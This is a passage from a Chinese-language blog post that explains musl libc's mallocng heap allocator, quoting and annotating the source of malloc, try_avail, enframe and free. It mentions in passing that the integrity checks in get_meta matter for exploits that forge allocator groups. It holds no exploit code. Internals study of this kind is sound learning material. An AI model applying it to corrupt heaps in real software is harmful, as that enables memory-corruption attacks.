class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> *<span class="title function_">malloc</span><span class="params">(<span class="type">size_t</span> n)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (size_overflows(n)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">g</span>;</span></span><br><span class="line"><span class="type">uint32_t</span> mask, first;</span><br><span class="line"><span class="type">int</span> sc;</span><br><span class="line"><span class="type">int</span> idx;</span><br><span class="line"><span class="type">int</span> ctr;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (n &gt;= MMAP_THRESHOLD) &#123;</span><br><span class="line"><span class="type">size_t</span> needed = n + IB + UNIT;</span><br><span class="line"><span class="type">void</span> *p = mmap(<span class="number">0</span>, needed, PROT_READ|PROT_WRITE,</span><br><span class="line">MAP_PRIVATE|MAP_ANON, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (p==MAP_FAILED) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">wrlock();</span><br><span class="line">step_seq();</span><br><span class="line">g = alloc_meta();</span><br><span class="line"><span class="keyword">if</span> (!g) &#123;</span><br><span class="line">unlock();</span><br><span class="line">munmap(p, needed);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">g-&gt;mem = p;</span><br><span class="line">g-&gt;mem-&gt;meta = g;</span><br><span class="line">g-&gt;last_idx = <span class="number">0</span>;</span><br><span class="line">g-&gt;freeable = <span class="number">1</span>;</span><br><span class="line">g-&gt;sizeclass = <span class="number">63</span>;</span><br><span class="line">g-&gt;maplen = (needed+<span class="number">4095</span>)/<span class="number">4096</span>;</span><br><span class="line">g-&gt;avail_mask = g-&gt;freed_mask = <span class="number">0</span>;</span><br><span class="line"><span class="comment">// use a global counter to cycle offset in</span></span><br><span class="line"><span class="comment">// individually-mmapped allocations.</span></span><br><span class="line">ctx.mmap_counter++;</span><br><span class="line">idx = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">goto</span> success;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">sc = size_to_class(n);</span><br><span class="line"></span><br><span class="line">rdlock();</span><br><span class="line">g = ctx.active[sc];</span><br><span class="line"></span><br><span class="line"><span class="comment">// use coarse size classes initially when there are not yet</span></span><br><span class="line"><span class="comment">// any groups of desired size. this allows counts of 2 or 3</span></span><br><span class="line"><span class="comment">// to be allocated at first rather than having to start with</span></span><br><span class="line"><span class="comment">// 7 or 5, the min counts for even size classes.</span></span><br><span class="line"><span class="keyword">if</span> (!g &amp;&amp; sc&gt;=<span class="number">4</span> &amp;&amp; sc&lt;<span class="number">32</span> &amp;&amp; sc!=<span class="number">6</span> &amp;&amp; !(sc&amp;<span class="number">1</span>) &amp;&amp; !ctx.usage_by_class[sc]) &#123;</span><br><span class="line"><span class="type">size_t</span> usage = ctx.usage_by_class[sc|<span class="number">1</span>];</span><br><span class="line"><span class="comment">// if a new group may be allocated, count it toward</span></span><br><span class="line"><span class="comment">// usage in deciding if we can use coarse class.</span></span><br><span class="line"><span class="keyword">if</span> (!ctx.active[sc|<span class="number">1</span>] || (!ctx.active[sc|<span class="number">1</span>]-&gt;avail_mask</span><br><span class="line">    &amp;&amp; !ctx.active[sc|<span class="number">1</span>]-&gt;freed_mask))</span><br><span class="line">usage += <span class="number">3</span>;</span><br><span class="line"><span class="keyword">if</span> (usage &lt;= <span class="number">12</span>)</span><br><span class="line">sc |= <span class="number">1</span>;</span><br><span class="line">g = ctx.active[sc];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (;;) &#123;</span><br><span class="line">mask = g ? g-&gt;avail_mask : <span class="number">0</span>;</span><br><span class="line">first = mask&amp;-mask;</span><br><span class="line"><span class="keyword">if</span> (!first) <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">if</span> (RDLOCK_IS_EXCLUSIVE || !MT)</span><br><span class="line">g-&gt;avail_mask = mask-first;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (a_cas(&amp;g-&gt;avail_mask, mask, mask-first)!=mask)</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">idx = a_ctz_32(first);</span><br><span class="line"><span class="keyword">goto</span> success;</span><br><span class="line">&#125;</span><br><span class="line">upgradelock();</span><br><span class="line"></span><br><span class="line">idx = alloc_slot(sc, n);</span><br><span class="line"><span class="keyword">if</span> (idx &lt; <span class="number">0</span>) &#123;</span><br><span class="line">unlock();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">g = ctx.active[sc];</span><br><span class="line"></span><br><span class="line">success:</span><br><span class="line">ctr = ctx.mmap_counter;</span><br><span class="line">unlock();</span><br><span class="line"><span class="keyword">return</span> enframe(g, idx, n, ctr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中<code>MMAP_THRESHOLD</code>等于131052。第一个判断如果为真，说明要分配一块很大的内存。首先计算一共需要的内存大小，这里<code>IB</code>等于4、<code>UNIT</code>等于16。然后使用<code>mmap</code>函数分配一块内存。如果分配成功，上读写锁。后面使用<code>alloc_meta</code>分配一个<code>meta</code>给这块大空间，之后设置这个<code>meta</code>的一些基本信息。</p><p>从这个if语句我们可以知道，如果一次内存申请的大小过大，musl libc会为这块空间专门分配一个meta和group，这个meta和group只管理这一个空间。</p><p>如果申请的空间较小，则进入下面的代码。</p><p><code>sc = size_to_class(n);</code>这条语句是为了计算这个大小的chunk应该被分到哪一个class。</p><p>在musl中定义有如下内容：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// /src/malloc/mallocng/malloc.c, line 12</span></span><br><span class="line"><span class="type">const</span> <span class="type">uint16_t</span> size_classes[] = &#123;</span><br><span class="line"><span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>,</span><br><span class="line"><span class="number">9</span>, <span class="number">10</span>, <span class="number">12</span>, <span class="number">15</span>,</span><br><span class="line"><span class="number">18</span>, <span class="number">20</span>, <span class="number">25</span>, <span class="number">31</span>,</span><br><span class="line"><span class="number">36</span>, <span class="number">42</span>, <span class="number">50</span>, <span class="number">63</span>,</span><br><span class="line"><span class="number">72</span>, <span class="number">84</span>, <span class="number">102</span>, <span class="number">127</span>,</span><br><span class="line"><span class="number">146</span>, <span class="number">170</span>, <span class="number">204</span>, <span class="number">255</span>,</span><br><span class="line"><span class="number">292</span>, <span class="number">340</span>, <span class="number">409</span>, <span class="number">511</span>,</span><br><span class="line"><span class="number">584</span>, <span class="number">682</span>, <span class="number">818</span>, <span class="number">1023</span>,</span><br><span class="line"><span class="number">1169</span>, <span class="number">1364</span>, <span class="number">1637</span>, <span class="number">2047</span>,</span><br><span class="line"><span class="number">2340</span>, <span class="number">2730</span>, <span class="number">3276</span>, <span class="number">4095</span>,</span><br><span class="line"><span class="number">4680</span>, <span class="number">5460</span>, <span class="number">6552</span>, <span class="number">8191</span>,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><code>size_to_class</code>的代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">int</span> <span class="title function_">size_to_class</span><span class="params">(<span class="type">size_t</span> n)</span></span><br><span class="line">&#123;</span><br><span class="line">n = (n+IB<span class="number">-1</span>)&gt;&gt;<span class="number">4</span>;</span><br><span class="line"><span class="keyword">if</span> (n&lt;<span class="number">10</span>) <span class="keyword">return</span> n;</span><br><span class="line">n++;</span><br><span class="line"><span class="type">int</span> i = (<span class="number">28</span>-a_clz_32(n))*<span class="number">4</span> + <span class="number">8</span>;</span><br><span class="line"><span class="keyword">if</span> (n&gt;size_classes[i+<span class="number">1</span>]) i+=<span class="number">2</span>;</span><br><span class="line"><span class="keyword">if</span> (n&gt;size_classes[i]) i++;</span><br><span class="line"><span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中经过试验可知<code>a_clz_32</code>这个函数返回的是n的最高位是32位中的倒数第几高位（最高位为0）。如<code>a_clz_32(1)=31</code>，<code>a_clz_32(2)=30</code>，<code>a_clz_32(4)=29</code>，以此类推。由此我们可以计算出不同大小的chunk对应于哪一个索引。这个部分实际上是将chunk的大小按照数组来进行分组，数组的每一项表示这一组中chunk右移4位的值不能超过多少。如索引为10的数组元素值为12，前面一个元素为10，则第10组chunk的大小范围应该在0x100-0x11F之间。同理，第11组chunk的大小范围为0x120-0x14F。</p><p>紧接着，上读写锁。后面<code>g = ctx.active[sc];</code>中的<code>ctx</code>指的是全局<code>__malloc_context</code>，其<code>active</code>数组长度与<code>size_classes</code>的相同，均为48。由此可见，<font color=red><strong>malloc_context将meta以管理的chunk大小进行分组，分组依据<code>size_classes</code>进行。</strong></font></p><p>再往下的一个if语句有很多的判断条件，在某些条件成立时会修改<code>meta</code>指针的值，对整体影响不大，先向下看。</p><p>下面是一个循环。<code>first = mask&amp;-mask;</code>是取<code>mask</code>的最低1位，即lowbit，这里的<code>avail_mask</code>实际就是选中的<code>meta</code>所管理的<code>group</code>中chunk的可用位，这里是通过可用位来查找第一个可用的chunk。内部的if-else语句是针对读写锁进行的检查，无需关注。如果在这里能够找到可用的chunk，则将chunk的索引保存到<code>idx</code>变量中。</p><p>如果在这个循环中没有找到合适的<code>idx</code>，则在循环外调用<code>alloc_slot</code>函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">alloc_slot</span><span class="params">(<span class="type">int</span> sc, <span class="type">size_t</span> req)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">uint32_t</span> first = try_avail(&amp;ctx.active[sc]);</span><br><span class="line"><span class="keyword">if</span> (first) <span class="keyword">return</span> a_ctz_32(first);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">g</span> =</span> alloc_group(sc, req);</span><br><span class="line"><span class="keyword">if</span> (!g) <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">g-&gt;avail_mask--;</span><br><span class="line"><span class="built_in">queue</span>(&amp;ctx.active[sc], g);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中<code>try_avail</code>函数尝试从该大小的<code>meta</code>中分配出一个可用的chunk并返回索引，如果该可用chunk不是由位于链首的<code>meta</code>所提供，则会将这个chunk所在的meta移动至链首。如果尝试分配成功，则这里直接返回。否则，后面调用<code>alloc_group</code>函数创建一个新的<code>meta</code>，创建成功后将其中的第一个chunk的索引（即0）返回，并将该<code>meta</code>放在链首。不论如何，最终只要能够执行到标号<code>success</code>，就一定能够获取到<code>idx</code>的值。</p><p>最后返回调用了<code>enframe</code>函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> *<span class="title function_">enframe</span><span class="params">(<span class="keyword">struct</span> meta *g, <span class="type">int</span> idx, <span class="type">size_t</span> n, <span class="type">int</span> ctr)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">size_t</span> stride = get_stride(g);</span><br><span class="line"><span class="type">size_t</span> slack = (stride-IB-n)/UNIT;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> *p = g-&gt;mem-&gt;storage + stride*idx;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> *end = p+stride-IB;</span><br><span class="line"><span class="comment">// cycle offset within slot to increase interval to address</span></span><br><span class="line"><span class="comment">// reuse, facilitate trapping double-free.</span></span><br><span class="line"><span class="type">int</span> off = (p[<span class="number">-3</span>] ? *(<span class="type">uint16_t</span> *)(p<span class="number">-2</span>) + <span class="number">1</span> : ctr) &amp; <span class="number">255</span>;</span><br><span class="line">assert(!p[<span class="number">-4</span>]);</span><br><span class="line"><span class="keyword">if</span> (off &gt; slack) &#123;</span><br><span class="line"><span class="type">size_t</span> m = slack;</span><br><span class="line">m |= m&gt;&gt;<span class="number">1</span>; m |= m&gt;&gt;<span class="number">2</span>; m |= m&gt;&gt;<span class="number">4</span>;</span><br><span class="line">off &amp;= m;</span><br><span class="line"><span class="keyword">if</span> (off &gt; slack) off -= slack+<span class="number">1</span>;</span><br><span class="line">assert(off &lt;= slack);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (off) &#123;</span><br><span class="line"><span class="comment">// store offset in unused header at offset zero</span></span><br><span class="line"><span class="comment">// if enframing at non-zero offset.</span></span><br><span class="line">*(<span class="type">uint16_t</span> *)(p<span class="number">-2</span>) = off;</span><br><span class="line">p[<span class="number">-3</span>] = <span class="number">7</span>&lt;&lt;<span class="number">5</span>;</span><br><span class="line">p += UNIT*off;</span><br><span class="line"><span class="comment">// for nonzero offset there is no permanent check</span></span><br><span class="line"><span class="comment">// byte, so make one.</span></span><br><span class="line">p[<span class="number">-4</span>] = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">*(<span class="type">uint16_t</span> *)(p<span class="number">-2</span>) = (<span class="type">size_t</span>)(p-g-&gt;mem-&gt;storage)/UNIT;</span><br><span class="line">p[<span class="number">-3</span>] = idx;</span><br><span class="line">set_size(p, end, n);</span><br><span class="line"><span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个函数的主要作用是从指定<code>meta</code>中取出指定索引的<code>chunk</code>。</p><h2 id="try-avail（-src-malloc-mallocng-malloc-c-line-114）"><a href="#try-avail（-src-malloc-mallocng-malloc-c-line-114）" class="headerlink" title="try_avail（/src/malloc/mallocng/malloc.c, line 114）"></a>try_avail（<code>/src/malloc/mallocng/malloc.c, line 114</code>）</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">uint32_t</span> <span class="title function_">try_avail</span><span class="params">(<span class="keyword">struct</span> meta **pm)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">m</span> =</span> *pm;</span><br><span class="line"><span class="type">uint32_t</span> first;</span><br><span class="line"><span class="keyword">if</span> (!m) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="type">uint32_t</span> mask = m-&gt;avail_mask;</span><br><span class="line"><span class="keyword">if</span> (!mask) &#123;</span><br><span class="line"><span class="keyword">if</span> (!m) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (!m-&gt;freed_mask) &#123;</span><br><span class="line">dequeue(pm, m);</span><br><span class="line">m = *pm;</span><br><span class="line"><span class="keyword">if</span> (!m) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">m = m-&gt;next;</span><br><span class="line">*pm = m;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">mask = m-&gt;freed_mask;</span><br><span class="line"></span><br><span class="line"><span class="comment">// skip fully-free group unless it&#x27;s the only one</span></span><br><span class="line"><span class="comment">// or it&#x27;s a permanently non-freeable group</span></span><br><span class="line"><span class="keyword">if</span> (mask == (<span class="number">2u</span>&lt;&lt;m-&gt;last_idx)<span class="number">-1</span> &amp;&amp; m-&gt;freeable) &#123;</span><br><span class="line">m = m-&gt;next;</span><br><span class="line">*pm = m;</span><br><span class="line">mask = m-&gt;freed_mask;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// activate more slots in a not-fully-active group</span></span><br><span class="line"><span class="comment">// if needed, but only as a last resort. prefer using</span></span><br><span class="line"><span class="comment">// any other group with free slots. this avoids</span></span><br><span class="line"><span class="comment">// touching &amp; dirtying as-yet-unused pages.</span></span><br><span class="line"><span class="keyword">if</span> (!(mask &amp; ((<span class="number">2u</span>&lt;&lt;m-&gt;mem-&gt;active_idx)<span class="number">-1</span>))) &#123;</span><br><span class="line"><span class="keyword">if</span> (m-&gt;next != m) &#123;</span><br><span class="line">m = m-&gt;next;</span><br><span class="line">*pm = m;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="type">int</span> cnt = m-&gt;mem-&gt;active_idx + <span class="number">2</span>;</span><br><span class="line"><span class="type">int</span> size = size_classes[m-&gt;sizeclass]*UNIT;</span><br><span class="line"><span class="type">int</span> span = UNIT + size*cnt;</span><br><span class="line"><span class="comment">// activate up to next 4k boundary</span></span><br><span class="line"><span class="keyword">while</span> ((span^(span+size<span class="number">-1</span>)) &lt; <span class="number">4096</span>) &#123;</span><br><span class="line">cnt++;</span><br><span class="line">span += size;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (cnt &gt; m-&gt;last_idx+<span class="number">1</span>)</span><br><span class="line">cnt = m-&gt;last_idx+<span class="number">1</span>;</span><br><span class="line">m-&gt;mem-&gt;active_idx = cnt<span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">mask = activate_group(m);</span><br><span class="line">assert(mask);</span><br><span class="line">decay_bounces(m-&gt;sizeclass);</span><br><span class="line">&#125;</span><br><span class="line">first = mask&amp;-mask;</span><br><span class="line">m-&gt;avail_mask = mask-first;</span><br><span class="line"><span class="keyword">return</span> first;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>经过查找，这个函数只在<code>alloc_slot</code>这一处被调用，参数填的是一个<code>meta</code>链表的链首地址指针。</p><p>这个函数的参数是<code>meta</code>的二重指针，首先解引用一层获取到<code>meta</code>指针，如果这个<code>meta</code>指针无效，则返回0。</p><p>如果该<code>meta</code>存在，则取出其<code>avail_mask</code>。如果这个值为0，说明这个<code>meta</code>中已经没有可以用来分配的chunk了。这就进入到大if语句体内：</p><p><strong><code>free_mask</code>与<code>avail_mask</code>相同，以比特位标识，每一个比特位表示一个chunk是否被释放。如被释放则比特值为1</strong>。&#x3D;&#x3D;如果<code>free_mask</code>为0&#x3D;&#x3D;，而此时<code>avail_mask</code>也为1，说明这个<code>meta</code>中既不能分配<code>chunk</code>，也没有已经释放的<code>chunk</code>，这种情况下应该将这个<code>meta</code>从链表中移除，即调用<code>dequeue</code>函数脱链。脱链之后<code>pm</code>应该指向新的链首<code>meta</code>指针。如果链表中没有其他<code>meta</code>，就返回0。&#x3D;&#x3D;如果<code>free_mask</code>不为0&#x3D;&#x3D;，则找到下一个<code>meta</code>，并将链首修改为这个<code>meta</code>。</p><p>之后检查新链首<code>meta</code>中的chunk是否全部被释放且该<code>meta</code>不是不可释放的。这里的<code>mask == (2u&lt;&lt;m-&gt;last_idx)-1</code>就是在判断<code>free_mask</code>的所有有效的比特是不是全为1，如果是则跳过该chunk并再次修改链首的<code>meta</code>为下一个<code>meta</code>。</p><p>下面是<code>if (!(mask &amp; ((2u&lt;&lt;m-&gt;mem-&gt;active_idx)-1)))</code>，<code>mask</code>是释放chunk的掩码，后面是全1的掩码，如果两者相与等于0，说明这个<code>meta</code>中没有chunk被释放。这个if语句是想要尽可能地使用已经有chunk被释放的<code>meta</code>而尽可能保留全部chunk都可以使用的<code>meta</code>，这样做的目的是减少脏页面的产生。内部判断如果这个<code>meta</code>不是仅有的一个<code>meta</code>，则使用下一个<code>meta</code>，否则没办法就只能使用这个“干净的”<code>meta</code>，else中所做的是在<code>group</code>中选择一个可以使用的chunk并设置相应控制位。</p><p>循环外面，是设置<code>meta</code>的<code>avail_mask</code>位，并返回将要分配出去的chunk索引。</p><h2 id="free（-src-malloc-mallocng-free-c-line-101）"><a href="#free（-src-malloc-mallocng-free-c-line-101）" class="headerlink" title="free（/src/malloc/mallocng/free.c, line 101）"></a>free（<code>/src/malloc/mallocng/free.c, line 101</code>）</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">free</span><span class="params">(<span class="type">void</span> *p)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (!p) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">g</span> =</span> get_meta(p);</span><br><span class="line"><span class="type">int</span> idx = get_slot_index(p);</span><br><span class="line"><span class="type">size_t</span> stride = get_stride(g);</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> *start = g-&gt;mem-&gt;storage + stride*idx;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> *end = start + stride - IB;</span><br><span class="line">get_nominal_size(p, end);</span><br><span class="line"><span class="type">uint32_t</span> self = <span class="number">1u</span>&lt;&lt;idx, all = (<span class="number">2u</span>&lt;&lt;g-&gt;last_idx)<span class="number">-1</span>;</span><br><span class="line">((<span class="type">unsigned</span> <span class="type">char</span> *)p)[<span class="number">-3</span>] = <span class="number">255</span>;</span><br><span class="line"><span class="comment">// invalidate offset to group header, and cycle offset of</span></span><br><span class="line"><span class="comment">// used region within slot if current offset is zero.</span></span><br><span class="line">*(<span class="type">uint16_t</span> *)((<span class="type">char</span> *)p<span class="number">-2</span>) = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// release any whole pages contained in the slot to be freed</span></span><br><span class="line"><span class="comment">// unless it&#x27;s a single-slot group that will be unmapped.</span></span><br><span class="line"><span class="keyword">if</span> (((<span class="type">uintptr_t</span>)(start<span class="number">-1</span>) ^ (<span class="type">uintptr_t</span>)end) &gt;= <span class="number">2</span>*PGSZ &amp;&amp; g-&gt;last_idx) &#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> *base = start + (-(<span class="type">uintptr_t</span>)start &amp; (PGSZ<span class="number">-1</span>));</span><br><span class="line"><span class="type">size_t</span> len = (end-base) &amp; -PGSZ;</span><br><span class="line"><span class="keyword">if</span> (len) &#123;</span><br><span class="line"><span class="type">int</span> e = errno;</span><br><span class="line">madvise(base, len, MADV_FREE);</span><br><span class="line">errno = e;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// atomic free without locking if this is neither first or last slot</span></span><br><span class="line"><span class="keyword">for</span> (;;) &#123;</span><br><span class="line"><span class="type">uint32_t</span> freed = g-&gt;freed_mask;</span><br><span class="line"><span class="type">uint32_t</span> avail = g-&gt;avail_mask;</span><br><span class="line"><span class="type">uint32_t</span> mask = freed | avail;</span><br><span class="line">assert(!(mask&amp;self));</span><br><span class="line"><span class="keyword">if</span> (!freed || mask+self==all) <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">if</span> (!MT)</span><br><span class="line">g-&gt;freed_mask = freed+self;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (a_cas(&amp;g-&gt;freed_mask, freed, freed+self)!=freed)</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">wrlock();</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mapinfo</span> <span class="title">mi</span> =</span> nontrivial_free(g, idx);</span><br><span class="line">unlock();</span><br><span class="line"><span class="keyword">if</span> (mi.len) &#123;</span><br><span class="line"><span class="type">int</span> e = errno;</span><br><span class="line">munmap(mi.base, mi.len);</span><br><span class="line">errno = e;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>free用于释放chunk，首先需要找到该chunk所在的meta。这个功能是如何实现的呢？</p><p>每一个chunk的前面都保存着这个chunk在<code>group</code>中的索引，通过<code>get_slot_index</code>函数我们就可以知道：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">int</span> <span class="title function_">get_slot_index</span><span class="params">(<span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *p)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> p[<span class="number">-3</span>] &amp; <span class="number">31</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可见索引值保存在索引为-3的位置。</p><p>对于索引值不为0的chunk，其还有一个<code>offset</code>保存在索引为-2的位置，它记录了当前chunk与第一个chunk首部的偏移量（右移4位的结果），因此通过这个值我们可以计算出该chunk所在<code>group</code>的首地址，由<code>group</code>中保存的<code>meta</code>地址找到<code>meta</code>。在<code>get_meta</code>函数中，找到<code>meta</code>后又找到了该<code>meta</code>所在的<code>meta_area</code>并进行了多项检查，防止<code>group</code>被伪造，如果我们想要通过伪造group来进行漏洞利用，就需要特别注意这里，这个我们以后再说。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span 